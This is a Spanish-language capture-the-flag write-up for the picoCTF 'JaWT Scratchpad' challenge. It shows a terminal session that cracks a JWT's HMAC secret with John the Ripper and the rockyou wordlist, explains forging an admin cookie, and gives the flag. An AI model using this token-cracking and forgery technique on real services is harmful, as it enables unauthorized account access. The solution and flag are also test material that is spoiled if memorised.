## Objetivo
Internal server errors can be intentionally returned by this challenge. If you experience one, try clearing your cookies.

Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/63090/` or http://jupiter.challenges.picoctf.org:63090
## Pistas
What is that cookie?

Have you heard of JWT?
## Solucion
```
(hectorr㉿kali2024)-[~]
└─$ nano JaWT Scratchpad                              
                                                                                             
┌──(hectorr㉿kali2024)-[~]
└─$ cat JaWT               
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYmVuaXRvIn0.kehgo-KN_d-H-ObN-sEsIeFUoah5ryg1Lh9UZPCUh40
                                                                                             
┌──(hectorr㉿kali2024)-[~]
└─$ ls /usr/share/wordlists
amass  dirbuster   fasttrack.txt  john.lst  metasploit  rockyou.txt.gz  wfuzz
dirb   dnsmap.txt  fern-wifi      legion    nmap.lst    sqlmap.txt      wifite.txt
                                                                                             
┌──(hectorr㉿kali2024)-[~]
└─$ gzip -d /usr/share/wordlists/rockyou.txt.gz
gzip: /usr/share/wordlists/rockyou.txt: Permission denied
                                                                                             
┌──(hectorr㉿kali2024)-[~]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 
[sudo] password for hectorr: 
                                                                                             
┌──(hectorr㉿kali2024)-[~]
└─$ ls /usr/share/wordlists                          
amass  dirbuster   fasttrack.txt  john.lst  metasploit  rockyou.txt  wfuzz
dirb   dnsmap.txt  fern-wifi      legion    nmap.lst    sqlmap.txt   wifite.txt
                                                                                             
┌──(hectorr㉿kali2024)-[~]
└─$ head /usr/share/wordlists/rockyou.txt 
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
                                                                                             
┌──(hectorr㉿kali2024)-[~]
└─$ john JaWT -w=/usr/share/worlists/roc
                                                                                             
┌──(hectorr㉿kali2024)-[~]
└─$ john JaWT -w=/usr/share/worlists/rockyou.txt
Created directory: /home/hectorr/.john
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 2 OpenMP threads
fopen: /usr/share/worlists/rockyou.txt: No such file or directory
                                                                                             
┌──(hectorr㉿kali2024)-[~]
└─$ john JaWT -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:06 DONE (2024-03-04 22:11) 0.1536g/s 1135Kp/s 1135Kc/s 1135KC/s iloverob4live345..ilovepatri
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                             
┌──(hectorr㉿kali2024)-[~]
└─$ 

picoCTF{jawt_was_just_what_you_thought_f859ab2f}
```

## Notas adicionales 
hicimos el uso de modificador de cookies, ademas utilizamos la pagina que puse aca abajo para que nos diera la cookies de admin solamnete sustituimos el nombre a admin, hicimos el uso de un archivo de kali linux que es rockyout.txt para que nos diera unas posibles contraseñas, ademas hicimos el uso de **john el nombre del archivo -w** 
cree un archivo con nano que le puse **JaWT** que ahi le introduci la crookie que hice yo que le puse de nombre benito, esto nos ayudo para el codigo de **john** y el uso de **rockyou.txt** para poder que cifrado tenia la cookie y al final supimos que fue con **ilovepico**
**Tambien una cosa importante al no quitar los espacios cuando sustituimos *ilovepico* puede que no salga nomas es quitar los espacios y que solamente este *ilovepico* fin**
## Referencias 
https://jwt.io/
https://jwt.io/introduction
